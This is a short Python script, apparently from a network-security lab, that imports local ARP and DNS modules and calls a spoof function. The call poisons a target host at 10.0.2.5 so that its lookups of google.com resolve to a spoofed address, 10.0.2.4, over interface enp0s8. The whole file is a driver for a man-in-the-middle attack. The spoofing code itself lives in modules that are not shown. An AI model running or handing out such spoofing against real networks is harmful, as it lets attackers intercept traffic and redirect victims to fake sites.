from arp import *
from dns import *

TARGET_IP = "10.0.2.5"
SPOOFED_IP = "10.0.2.4"
IFACE = "enp0s8"

spoof(IFACE, "google.com", TARGET_IP, SPOOFED_IP)
